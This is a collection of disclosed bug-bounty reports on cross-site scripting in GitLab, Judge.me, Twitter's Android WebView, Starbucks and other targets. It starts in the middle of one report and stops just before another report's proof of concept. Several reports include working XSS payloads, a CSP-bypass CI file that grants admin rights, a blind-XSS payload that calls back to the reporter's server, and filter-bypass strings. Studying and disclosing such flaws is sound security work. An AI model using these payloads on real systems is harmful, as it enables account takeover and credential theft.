- Click Scan QR Code button & Scan the QR Code above

{F2191708}

- Xss Executed.

{F2191706}  {F2191705}



## Supporting Material/References:

{F2191774}


https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-23258

## Impact

Attackers can steal the victim's cookies, and as you can see at this point. that this vulnerability does not only affect brave, but will affect all existing domains/websites. and it is very possible that websites such as facebook.com, google.com, microsoft.com are also affected by this vulnerability
example :
https://portswigger.net/daily-swig/microsoft-edge-translator-contained-uxss-flaw-exploitable-on-any-web-page

---

### [CSP-bypass XSS in project settings page](https://hackerone.com/reports/1588732)

- **Report ID:** `1588732`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** GitLab
- **Reporter:** @yvvdwf
- **Bounty:** - usd
- **Disclosed:** 2022-11-16T01:08:32.456Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

This javascript [function](https://gitlab.com/gitlab-org/gitlab/-/blob/85fbd72dc08bcedcb9fe80fad4df798e9527ded8/app/assets/javascripts/projects/settings/access_dropdown.js#L534) is vulnerable:


```javascript
  deployKeyRowHtml(key, isActive) {
    const isActiveClass = isActive || '';

    return `
      <li>
        <a href="#" class="${isActiveClass}">
          <strong>${key.title}</strong>
          <p>
            ${sprintf(
              __('Owned by %{image_tag}'),
              {
                image_tag: `<img src="${key.avatar_url}" class="avatar avatar-inline s26" width="30">`,
              },
              false,
            )}
            <strong class="dropdown-menu-user-full-name gl-display-inline">${escape(
              key.fullname,
            )}</strong>
            <span class="dropdown-menu-user-username gl-display-inline">${key.username}</span>
          </p>
        </a>
      </li>
    `;
  }
```

It is used to render a deployment key in a dropdown item. Because the deployment title is controlled by users, it can be any html content, such as, `<script>alert(document.domain)</script>`. Furthermore, the html content will be [rendered](https://gitlab.com/gitlab-org/gitlab/-/blob/85fbd72dc08bcedcb9fe80fad4df798e9527ded8/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#L396) using jQuery, so the `<script>` tag will be executed despise of CSP with `script-src ` having  `'strict-dynamic'`  value:

```javascript
  renderMenu(html) {
    if (this.options.renderMenu) {
      return this.options.renderMenu(html);
    }
    return $('<ul>').append(html);
  }
```

### Steps to reproduce

1. In an existing project or create a new one, goto `Settings`/`Repository`. Then fill the form in `Deploy keys` as the following:

- `Title`:  `test <script>alert(document.domain)</script>`
- `Key`:  `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkhkyrQJvb30Q5lLZzxeALqCyBrLOh+QzRYWh+gPGpqi2efyGMf5beN2zda66OI6DaclB31SJ0jYzaYKgKXQw7rzu/IYazONdy5lz5O2iUB2BkDzJYZ+BObTaTCjyDgSvNNuezUqNXXqoXftEMa1l0+FRSkTusH5F2P3JCV3Tf1BBQImrbDIpdc6ps+UxsiX7S/dT+7bNIVXblC8s8k+AK4CWsC2KmfMToK35pk+sa9JI+rb26hzv8IHA8n7cqXOmR5qAj2qX962p1kOLNXCyHJAKAIfRXCuDPbXiB+kjnu478eIcudOPveo3CK3G6hBI0hPSRfoyAUIubcddnnbhR `
- `Grant write permissions to this key`:  Checked

Then click `Add key` button to save the form.

{F1752821}


__NOTE__: 

- `Title` can be any HTML content that represents the attack payload. In the example above, we just show an alert containing the current domain.
- `Key` can be any valid SSH public key. In the example above, I give you a random key so that you can copy-paste into the form without the need to generate a key

2. Always in the `Settings`/`Repository` page, click on `Protected branches` link to expand its form
3. Click on the dropdown box under `Allowed to push `, you should see an alert that was generated when the payload above being executed

{F1752822}

__NOTE__:

- This is not self-XSS as any project maintainer can access to the settings page. Furthermore a victim can be added as a project maintainer without their explicit acceptation
- The Step 2 can be ignored by accessing directly within `#js-protected-branches-settings` on the url, for example, `https://gitlab.com/yvvdwf/xss/-/settings/repository#js-protected-branches-settings`

### Impact

XSS with CSP bypass allows attacks to perform arbitrary malicious requests on behalf of victims on HTTP client side, such as, do an API request to access to private resources, etc.

### Examples

https://gitlab.com/yvvdwf/xss/-/settings/repository#js-protected-branches-settings

### What is the current *bug* behavior?

Deployment title is not sanitized

### What is the expected *correct* behavior?

Deployment title should be sanitized

### Output of checks

This bug happens on GitLab.com

## Impact

XSS with CSP bypass allows attacks to perform arbitrary malicious requests on behalf of victims on HTTP client side, such as, do an API request to access to private resources, etc.

---

### [XSS: `v-safe-html` is not safe enough](https://hackerone.com/reports/1579645)

- **Report ID:** `1579645`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** GitLab
- **Reporter:** @yvvdwf
- **Bounty:** - usd
- **Disclosed:** 2022-11-16T01:08:16.508Z
- **CVE(s):** -

**Vulnerability Information:**

`v-safe-html` directive uses Dompurify [to remove](https://gitlab.com/gitlab-org/gitlab-ui/-/blob/9f1bcb1f7392d4d6d072f10197c2aab2c29c3287/src/directives/safe_html/constants.js#L3)  `data-remote', 'data-url', 'data-type', 'data-method'` attributes from HTML tags. Rails-js relies on another attribute, [`data-disable-with`](https://github.com/rails/rails/blob/v6.1.4.7/actionview/app/assets/javascripts/rails-ujs.coffee#L10) to [show a HTML content](https://github.com/rails/rails/blob/v6.1.4.7/actionview/app/assets/javascripts/rails-ujs/features/disable.coffee#L41) when an user clicks on a disabled link.

For example, the following text will bypass the sanitization and popup an alert when an user clicks on the link (which is a transparent topmost layer since the sanitization allows also `style` and `class` attributes):

```html
<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
```

An exploitation can be done via [jobs' error messages](https://gitlab.com/gitlab-org/gitlab/-/blob/38af35c2a4aa666f914484d3f119b813651a2041/app/assets/javascripts/jobs/components/job_app.vue#L215) which contain [CI job names](https://gitlab.com/gitlab-org/gitlab/-/blob/7f86b5b78c107f7124b54e1f797099741765b3d2/app/serializers/build_details_entity.rb#L154) which are provided by users.



### Steps to reproduce

1. In an existing project or create a new one, add `.gitlab.ci` file with the following content:

```yaml
'1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">':
  stage: build
  script: echo "hi"

'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>':
  stage: build
  script: echo "hi"

trigger-xss:
  stage: test
  script: echo "hi"
  dependencies:
    - '1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>'
```

2. Go to `CI/CD`/`Jobs` tab and wait for the CI jobs finished

3. If you are testing on a local instance without CSP protection, click on detail of the job `1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">`, then click on the trash button on the right literal bar to `Erase job logs and artifacts`.

3. Go back to the job list, click on `trigger-xss` link to view the detail of this job. Then click on `Retry` button on the right literal bar to retry the job.

4. An error message appears: `This job could not start because it could not retrieve the needed artifacts: 1. XSS when no CSP`. Click anywher to trigger the alert

Note: on gitlab.com or an instance having CSP protection (with `strict-dynamic` value of `script-src`), the inline script, such as `onerror` or the [`<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>`](https://gitlab.com/gitlab-org/gitlab/-/issues/233473), will be prevented to trigger. In such a case, we may use `<form>` tag to trigger arbitrary API requests on behalf of the user, for example, this allows escalate to admin permission when administrator *click anywhere* `2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>`

### Impact

XSS allow attackers to perform arbitrary actions on behalf of victims at client side.

### Examples

https://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498306483

https://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498287882

### Output of checks

This bug happens on GitLab.com

## Impact

XSS allow attackers to perform arbitrary actions on behalf of victims at client side.

---

### [XSS in ZenTao integration affecting self hosted instances without strict CSP](https://hackerone.com/reports/1542510)

- **Report ID:** `1542510`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** GitLab
- **Reporter:** @joaxcar
- **Bounty:** 13950 usd
- **Disclosed:** 2022-09-22T09:10:59.040Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

The ZenTao issue integration (premium feature) is susceptible to an XSS attack by delivering modified API responses to GitLab.

This is related and similar to my report https://hackerone.com/reports/1533976 but this time affecting the ZenTao integration.

A user can create a project and configure ZenTao to be used as an external issue tracker. [ducumentation](https://docs.gitlab.com/ee/user/project/integrations/zentao.html). If this is done on a `premium` instance the integration will add an `issue list` to the project displaying ZenTao issues, and clicking one of these issues will display issue details for a single ZenTao issue. The URL for a single issue looks like

https://gitlab.example.com/GROUP/PROJECT/-/integrations/zentao/issues/story-1

Visiting this page will trigger the GitLab backend to make an API request to the configured ZenTao instance like this

https://zentao.example.net/api.php/v1/issues/story-1

and the response from such a request looks like

```json
{
    "issue": {
        "id": "story-1",
        "title": "story",
        "labels": [ ],
        "pri": 3,
        "openedDate": "2021-08-10T08:25:18Z",
        "openedBy": {
            "id": 1,
            "account": "admin",
            "realname": "admin",
            "avatar": "https://www.gravatar.com/avatar/21232f297a57a5a743894a0e4a801fc3?d=identicon&s=80",
            "url": "https://jihudemo.zentao.net/index.php?m=user&f=profile&userID=1"
        },
        "lastEditedDate": "2021-08-10T08:25:18Z",
        "lastEditedBy": "admin",
        "status": "opened",
        "url": "https://jihudemo.zentao.net/index.php?m=story&f=view&storyID=32",
        "desc": "",
        "assignedTo": [],
        "comments": [ ]
    }
}
```
 This response is serialized by [ee/app/serializers/integrations/zentao_serializers/issue_entity.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/serializers/integrations/zentao_serializers/issue_entity.rb)

The interesting part of this file is

```ruby
     expose :web_url do |item|
        item['url']
      end
```

and also 

```ruby
      expose :id do |item|
        sanitize(item['id'])
      end
```

The `:web_url` does not check for correctness of the URL and can thus be given a JavaScript URL such as `javascript:alert(document.domain)`. The `:id` is sanitized by ruby sanitizer, but is not HTML encoded. This will open up a "safe" HTML injection, which we can use to make the attack easier to pull of.

When viewing a ZenTao issue details page the `:web_url` and `:id` is used to create the last part of the breadcrumb links. By adding this to our API response

```json
{
   "id": "<img src=# height=10000 width=10000>",
   "url": "javascript:alert(document.domain)"
}
```

The details page will now display a giant image that on click will trigger the XSS.

Here I use an image tag just to prove that the injection. The `:id` HTML injection can be customized to have the victim more prone to clicking the link.

Infected page:
{F1695165}

Popup:
{F1695164}

### Steps to reproduce

Using my hosted server (see example further down for self hosting the attack):
1. Log in with a user on a self hosted GitLab instance with premium subscription (call the user `user1`)
2. Create a new project, call it `project1`
3. Go to https://gitlab.example.com/user1/project1/-/integrations/zentao/edit
4. Fill in the form. Put `https://joaxcar.com` in the server field. Leave the API field empty, add anything in the username and password.
5. Go to
https://gitlab.example.com/user1/project1/-/integrations/zentao/issues/story-1
6. Click the big white square
7. XSS triggered

To self host the API make sure to host a server that will deliver this payload with a `application/json` response to calls to `/api.php/v1/issues/story-1`

payload
```json
{
    "issue": {
        "id": "<img src=# height=10000 width=10000>",
        "title": "Attack",
        "labels": [],
        "pri": 3,
        "openedDate": "2021-08-10T08:25:18Z",
        "openedBy": {
            "id": 1,
            "account": "asd",
            "realname": "admin",
            "avatar": "https://www.gravatar.com/avatar/21232f297a57a5a743894a0e4a801fc3?d=identicon&s=80",
            "url": "https://example.com"
        },
        "lastEditedDate": "2021-08-10T08:25:18Z",
        "lastEditedBy": "asd",
        "status": "asd",
        "url": "javascript:alert(document.domain)",
        "desc": "description",
        "assignedTo": [],
        "comments": []
    }
}
```

### Impact

Full XSS on self hosted GitLab instances. A victim needs to visit the infected page and made to click a special link (can be made easy to click)

### What is the current *bug* behavior?

ZenTao issue URLs are not sanitized

### What is the expected *correct* behavior?

Javasript URLs should be filtered

### CSP
This attack does not work on GitLab.com as the CSP rules block any JavaScript URL. I don't know of any bypass to this. But it does affect self-hosted instances that have not configured CSP. I calculated my CVSS score as per attacking a self-hosted instance. GitLab team can modify this according to your current treatment of these issues!

### Ruby sanitation
The ZenTao issues uses a lot of `ruby sanatize` sanitization. This is strict enough to prevent any serious code injection but still allows for some HTML tags to be included where they are supposed not to be. Like in ID in this issue.

Best regards
Johan

## Impact

Full XSS on self hosted GitLab instances. A victim needs to visit the infected page and made to click a special link (can be made easy to click)

---

### [Blind XSS in app.pullrequest.com/████████ via /reviews/ratings/{uuid}](https://hackerone.com/reports/1558010)

- **Report ID:** `1558010`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** HackerOne
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2022-05-25T16:28:23.139Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hi,

While researching PullRequest yesterday, I saw some "review" endpoints in web archive of "app.pullrequest.com". (http://web.archive.org/cdx/search/cdx?url=app.pullrequest.com/*&output=text&fl=original&collapse=urlkey)

One of them was https://app.pullrequest.com/reviews/ratings/6eaa6b75-b958-4530-ba46-0d00cbe74e0b/false , I went to that endpoint and filled the all fields with my blind XSS payload.
`'"><img src=x id=█████ onerror=eval(atob(this.id))>`

This payload sends an alert to my blind XSS application in `██████`

Today (May 3, 2022, 6:09 pm UTC+3), I got a lot of alerts from https://app.pullrequest.com/███. I checked the report and I see it came from an PullRequest admin who checks reviews. 

Here is a screenshot from the report :

███████

I checked the HTML source code and I see my payload reflected to `Disliked_reviewers`,  `Liked_reviewers` and `Reasons` fields without any encoding. 

You can also check the source code : █████████

## Impact

Blind XSS in PullRequest admin portal

Regards,
Bugra

---

### [Email templates XSS by filterXSS bypass](https://hackerone.com/reports/1404804)

- **Report ID:** `1404804`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Judge.me 
- **Reporter:** @caue
- **Bounty:** 1250 usd
- **Disclosed:** 2022-05-25T07:45:26.623Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
`js-xss` is used to prevent XSS on email templates previews but the custom `onIgnoreTag` function can be used to bypass this filter. This leads to a Self-XSS scenario that can be used to achieve Account Takeover in 1-click.

```js
onIgnoreTag: function (e, t) {
   return "!--[if" === e || "![endif]--" === e || "<!-->" === t ? t : void 0; 
},
```

## XSS

The way how `js-xss` parse tags starting with `<![` differ from how browser parse it, so it's possible to abuse this in this way:
```html
<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">
```
Sending this as the HTML email template will trigger an XSS when the email is previewed. Since email templates are private and only the owner of the template can preview it, this can be considered a Self-XSS. But there is a way to do another user preview it, leading to an account takeover in 1-click.
We can use HMAC authentication feature to force another user login in our account and preview the malicious email:
```
https://www.judge.me/shop/emails/2243518/edit?no_iframe=1&shop_domain=wordpress.caueo.me&platform=woocommerce&hmac=████
```
This URL authenticates as admin on `wordpress.caueo.me` domain, where the malicious email will be. The HMAC hash is created on this way (taken from wordpress plugin):
```php
$hmac       = hash_hmac( 'sha256', "no_iframe=1&platform=woocommerce&shop_domain={$domain}", $token, false );
```

Having this XSS with the victim logged in my account is possible to leak HTML content of a page that was loaded with victim's account cookie:

1. Load an iframe with the victim's page (HTML content to leak) - Authenticated as victim
2. Load another iframe with the XSS (Use HMAC authentication) - Authenticated as me
3. We can use the XSS to read `parent.frames[0]` HTML content since it is same-origin

## CSP bypass
At a first sight we can't load an iframe to victim's page, since it has a CSP that whitelists iframe origins:
```
frame-ancestors https://wordpress.caueo.me http://wordpress.caueo.me wordpress.caueo.me https://woocommerce-adapter.judge.me/ *.judge.me
```
To bypass it we can use the XSS to load the iframes, but we need to do it on another subdomain, because to trigger this XSS is needed to login in my account and then it would not be possible to load the victim's page authenticated as victim's account later. So we trigger the XSS on `www.judge.me` subdomain.

## Limitation to 0-click account takeover
At this point it is already **possible to read HTML content of almost any page authenticated as victim**. To achieve account takeover we only need to get the private API token from victim because it is used as the key of HMAC authentication.
The problem is that the endpoint that retrieves the API private token checks if the `Referer` header starts with `https://judge.me/settings`, so is not possible to load this endpoint in an iframe.

## Clickjacking
We can load an iframe to `https://judge.me/settings` where has a button that retrieves the API token from the endpoint successfully. So it is possible to perform a clickjacking to that button, and if the victim clicks on it, we can get the API private token. 

## PoC
I made a PoC on how is possible to perform this account takeover with user interaction and leak some stuffs without user interaction.
[PoC](https://www.judge.me/shop/emails/2243518/edit?no_iframe=1&shop_domain=wordpress.caueo.me&platform=woocommerce&hmac=█████████)

In this PoC I leaked FreshChat token without clickjacking, so we can impersonate another user in support chat without needing a user click.

## Impact

Shop account takeover (user interaction)
Impersonation on support chat
Private content leak

**Summary (team):**

XSS in `js-xss` with `onIgnoreTag` option. 

`js-xss` is used to prevent XSS on email templates previews but the custom `onIgnoreTag` function can be used to bypass this filter. This leads to a Self-XSS scenario that can be used to achieve Account Takeover in 1-click.

The way how js-xss parse tags starting with <![ differ from how browser parse it, so it's possible to abuse this in this way:
```html
<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">
```

---

### [Universal Cross-Site Scripting vulnerability](https://hackerone.com/reports/1326264)

- **Report ID:** `1326264`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Proctorio
- **Reporter:** @sector7-nl
- **Bounty:** - usd
- **Disclosed:** 2021-12-14T08:35:56.715Z
- **CVE(s):** -

**Summary (team):**

Sector7.nl notified Proctorio that there was a universal cross-site scripting vulnerability within the browser extension on June 17th, 2021. This vulnerability was patched on June 24th, 2021. Sector7.nl and other researchers were notified on June 25th. On August 3rd, 2021 Sector7.nl confirmed the vulnerability was successfully patched.

---

### [Android WebViews in Twitter app are vulnerable to UXSS due to configuration and CVE-2020-6506](https://hackerone.com/reports/906433)

- **Report ID:** `906433`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** X / xAI
- **Reporter:** @alesandroortiz
- **Bounty:** 560 usd
- **Disclosed:** 2020-09-24T19:11:25.599Z
- **CVE(s):** CVE-2020-6506

**Vulnerability Information:**

## Summary:

CVSS score: 8.1 / High / CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

**Embargo notice: Do Not Disclose publicly until https://crbug.com/1083819 is disclosed.**

Twitter for Android is affected by a UXSS vulnerability due to its configuration of Android WebView and CVE-2020-6506.

Vendor mitigation is recommended to protect unpatched WebView users, due to its impact and ease of exploitation. Mitigation options which minimize breaking changes are provided for various use cases.

Android WebView is the system component which allows Android apps to display web pages. Apps typically use Android WebView directly or via frameworks/libraries.

CVE-2020-6506 is a universal cross-site scripting (UXSS) vulnerability in Android WebView which allows cross-origin iframes to execute arbitrary JavaScript in the top-level document. This vulnerability affects vendors which use Android WebView with a default configuration setting, and run on systems with Android WebView version prior to 83.0.4103.106.

All relevant details to understand and mitigate the vulnerability should be in this report. As an affected vendor, you may request access to the restricted crbug for full details and discussion, subject to acceptance by the Chromium Security Team. To request access, send me an email.

## CVE-2020-6506 Details:
Embargo notice: Do Not Disclose publicly until https://crbug.com/1083819 is disclosed.

An Android WebView instance with WebSettings.setSupportMultipleWindows() kept at default or set to false allows an iframe on a different origin bypass same-origin policies and execute arbitrary JavaScript in the top document.

To perform the attack, an iframe can call window.open() with a javascript: URL. Other methods of opening a new window, such as a link with target=”_blank” and href=”javascript:...”, can also be used to perform the attack.

Performing the attack requires a single user interaction (a tap/click or a keypress). The malicious iframe does not need to be visible, and can obtain the keypress interaction while a user attempts to type in the top-level document (no direct iframe interaction required).

The patched version of Android WebView (83.0.4103.106) was released on Monday, June 15th, 2020: https://chromereleases.googleblog.com/2020/06/stable-channel-update-for-desktop_15.html

Vendors can and should mitigate CVE-2020-6506 to protect their users using unpatched Android WebView versions.

## Vendor Details:
Twitter for Android uses WebViews to render the URL in Video Website Cards. This type of Card uses the vulnerable WebView configuration, therefore there's two ways a user can reach the vulnerable WebView:
1. Advertiser creates legitimate Video Website Card pointing to the advertiser URL, then shares it via regular Tweets or paid advertising campaigns.
2. Attacker creates Video Website Card with the user-trusted target URL, then shares it via regular Tweets or paid advertising campaigns.

If the advertiser/target URL has a malicious or compromised iframe, the iframe can perform the UXSS attack with minimal user interaction (tap/click or keypress). If there's sensitive data in the WebView, it is vulnerable to exfiltration. Page contents and data can also be altered to benefit the attacker, such as requesting sensitive info from the user while purporting to be the advertiser/target URL.

Based on Twitter's use case, the suggested solution is option 1a or 1b. The final determination is left to the vendor. Reference implementations for each option is available by request.

If none of these options appear suitable, please provide feedback to address concerns. Other vendors could have the same concerns, so your input is appreciated to best mitigate for all affected vendors.

### Potential Solutions:
Vendors generally have two choices to mitigate for unpatched WebView users:
1. Enable multiwindow support. If needed, implementation options exist to mimic single-window behavior and minimize breaking changes. Does not require multi-tab UI. Suitable for browsers and frameworks.
2. Keep multiwindow support disabled, and strictly limit WebView rendering to trusted content only. Suitable for non-browser apps, and for frameworks when used in non-browser apps.

Detailed choices:
* Option 1a: Enable multiwindow support, and create a new tab in UI or block window creation.
    * Suitable and preferred choice for browsers.
    * Implementation: Set WebSettings.setSupportMultipleWindows() to true, and handle onCreateWindow() callback to create new tab in UI or block window creation.
    * Potential downsides: If all window creation is blocked, user experience may be negative.

* Option 1b: Enable multiwindow support, and mimic single-window behavior via WebView instance replacement.
    * Suitable for browsers and frameworks. Preferred choice for frameworks.
    * Potential implementation: Set WebSettings.setSupportMultipleWindows() to true, and handle onCreateWindow() callback to create a new WebView on top of existing WebView. Rebind any event listeners, state info, and other logic to the new WebView. Finally, destroy the old WebView as soon as possible.
    * Potential downsides: May cause breaking changes if existing code expects a single WebView instance for duration of use.
To minimize breaking changes, vendor could add an abstraction layer to internally track WebView instances. The abstraction could perform necessary setup/cleanup for each instance to maintain current WebView behavior (such as JS injection on first page load or each page load, event listeners, state, etc.). The abstraction layer could then seamlessly provide existing interfaces to other layers.

* Option 1c: Enable multiwindow support, and mimic single-window behavior via WebView instance reuse.
    * Suitable for browsers and frameworks.
    * Only if Option 1b is not feasible, and existing code expects a single WebView instance for duration of use. Minimizes breaking changes at the cost of complexity and fragility.
    * Potential implementation: Set WebSettings.setSupportMultipleWindows() to true, and handle onCreateWindow() callback. In the callback, create a temporary WebView with shouldOverrideUrlLoading() which returns true (prevents loading) and stores the attempted URL in a variable. Filter the attempted URL to ensure it is a safe HTTP(S) URL, then call loadUrl() on the initial WebView with the attempted URL. Finally, destroy the temporary WebView when convenient.
    * Potential downsides: May still cause breaking changes. May break if Android WebView behavior changes in future. Adds complexity which may be difficult to maintain.

* Option 2: Keep multiwindow support disabled, and enforce strict origin allowlist.
    * Suitable for non-browser apps, and for frameworks when used in non-browser apps.
    * Because the vulnerability is not mitigated with this option, WebViews must only render first-party trusted content in top-level window and iframes. If using cross-origin iframes, they must be properly sandboxed. Cross-origin iframes must avoid sandbox="allow-popups allow-top-navigation allow-scripts" because this allows exploitation.
    * Potential downsides: Any bypass of origin filtering allows exploitation of unpatched WebView users. For frameworks with configurable origin allowlists, developers can misconfigure allowlists and make their apps vulnerable.

Adjacent phishing mitigation: If the current page URL is not guaranteed to be shown to the user, origin allowlists are recommended to mitigate phishing risks. This is an adjacent vulnerability, but it's a good opportunity to mitigate it because URL filtering is likely to be implemented as part of the UXSS mitigation.

Additional implementation details for options 1a and 1b: When using multiple WebView instances simultaneously, ensure to destroy the background WebView, unload the background page, or handle background page events safely. Otherwise, background pages can perform actions which should only be allowed by a foreground page, which often cause other security issues.

## Environment:
Device: Samsung Galaxy S10 + Emulated Android device
OS version: Android 10 (on both devices)
Twitter version: 8.50.0-release.02

## Steps To Reproduce:

### Prerequisites:
* System with unpatched Android WebView (prior to version 83.0.4103.106)
* Twitter Video Website Card with landing URL pointed to a PoC URL. (Provides WebView with WebSettings.setSupportMultipleWindows() kept at default or set to false.)
  * PoC 1: https://twitter.com/AlesandroOrtizR/status/1275538453183238144 
  * PoC 2: https://twitter.com/AlesandroOrtizR/status/1275538647702548480 

### Steps To Reproduce, tap/click interaction, visible iframe:
1. Using the PoC 1 Card, navigate to https://alesandroortiz.com/security/chromiumwebview/cve-2020-6506.html
2. Tap/click iframe.

### Steps To Reproduce, keypress interaction, hidden iframe:
1. Using the PoC 2 Card, navigate to https://alesandroortiz.com/security/chromiumwebview/cve-2020-6506-keypress-2.html
2. Tap the "search this site" input field to focus it. (This input field is in the parent page, not the iframe.)
3. Start typing. Before/while you type, the focus will be stolen by the hidden iframe. After typing a character while the iframe input is focused, the attack is immediately performed. (This can be made more subtle by delaying the focus theft, see code comments.)

Expected Behavior:
JavaScript is not executed in top-level document. HTML is not written to top-level document and JS alert dialog is not shown (or a JS alert dialog is shown but with info from iframe document). 

Observed Behavior:
JavaScript is executed in top-level document. HTML is written to top-level document, and if the WebView allows JS alert dialogs, a JS alert dialog is also shown with info from top-level document. 

## Supporting Material/References:

  * twitter-cve-2020-6506.mp4: Screen recording of both reproduction cases.
  * Twitter-CVE-2020-6506-Report.pdf: Original report in PDF, in case any formatting is missing or difficult to parse in HackerOne.

**Embargo notice: Do Not Disclose publicly until https://crbug.com/1083819 is disclosed.**

## Impact

A malicious iframe on any page within the vulnerable WebView can perform a UXSS attack on the top-level document with minimal user interaction.

**Summary (researcher):**

More details on CVE-2020-6506 available at: https://alesandroortiz.com/articles/uxss-android-webview-cve-2020-6506/

---

### [Subdomain takeover due to an unclaimed Amazon S3 bucket on ███](https://hackerone.com/reports/918946)

- **Report ID:** `918946`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0x0d0
- **Bounty:** - usd
- **Disclosed:** 2020-09-03T17:29:19.205Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An unclaimed Amazon S3 bucket on █████████ gives an attacker the possibility to gain full control over this subdomain.

**Description:**
`███████` pointed to an S3 bucket that did no longer exists. The bucket points to an Amazon S3 website bucket in the US East region. I claimed this bucket and successfully took over this subdomain. 

Note:
I am reporting this issue to DoD since: "████████ ██████" The ████████ is linked to ███, so I believe this belongs here. I discovered this domain initially from the DoD websites list. Please excuse if this is a misconception. 

## Impact
This is extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the ██████████ domain. This would allow them to post malicious content which would be mistaken for a valid site. They could:
 * XSS
 * Phishing
 * Bypass domain security 
 * Steal sensitive user data, cookies, etc. 

## Step-by-step Reproduction Instructions
`dig ███` results in: 

```
; <<>> DiG 9.11.3-1ubuntu1.12-Ubuntu <<>> ███
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 53839
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;███████.    IN  A

;; ANSWER SECTION:
██████████. 1022 IN CNAME   ████-website-us-east-1.amazonaws.com.
██████████-website-us-east-1.amazonaws.com. 1022 IN CNAME s3-website-us-east-1.amazonaws.com.
s3-website-us-east-1.amazonaws.com. 2542 IN A   █████

;; Query time: 304 msec
;; SERVER: 10.68.0.1#53(10.68.0.1)
;; WHEN: Wed Jul 08 22:01:20 KST 2020
;; MSG SIZE  rcvd: 154
```

1. █████████ points to an Amazon S3 bucket in the S3 US East 1 region. Visiting http://███████ revealed that the bucket did not exist (refer to `before.png`). 
2. I created an S3 bucket with the name `████████` on my S3 account in the US East 1 region and uploaded an `index.html` and  an XSS POC (`xss_poc_998877665544332211.html`).
3. Visiting http://███ shows the successful subdomain takeover. View the page source to see the following comment: ` <!-- Demonstrated subdomain takeover by chron0x -->`
4. Visiting http://████████/xss_poc_998877665544332211.html you can see the simple XSS payload in action. 

## Suggested Mitigation/Remediation Actions
Remove the █████ DNS entry and I will remove the bucket from my Amazon account as soon as this issue is resolved. If you want to reclaim the domain instead, please let me know in the comments and I free the bucket before.

## Impact

High. An attacker can use the domain for various malicious activities ranging from XSS, over phishing to cookie stealing, etc. All of this while using a trusted domain name (██████).

---

### [Cross-Site Scripting (XSS) on www.starbucks.com | .co.uk login pages](https://hackerone.com/reports/881115)

- **Report ID:** `881115`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Starbucks
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2020-06-30T22:44:06.701Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

**Summary:** 
There is a cross-site scripting vulnerability on the login page of  www.starbucks.com and various regions, due to improper escaping on the URL path.

**Description:**
The login page at https://www.starbucks.com/account/signin builds several links by the relative URL path. An attacker can actually control the relative path: 

{F839656}

Furthermore, the application does not escape certain characters –  allowing us to break out of the tags and inject a malicious event handler.

**Platform(s) Affected:** 
- https://www.starbucks.com/account/signin
- https://www.starbucks.co.uk/account/signin

## Steps To Reproduce:

  1. Open Chrome or Firefox
  2. Visit `https://www.starbucks.com/account/(A(%22%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22))/signin` and in the upper right-hand corner, move your mouse over the "Find the Store" button.

The XSS will trigger and you'll get an `alert()` with the value of `document.domain`

{F839657}


## Exploitation: 
Since this is on the **login page**, it is absolutely trivial to steal user credentials.

Here's a simple proof-of-concept, this will just alert() your password back to you:

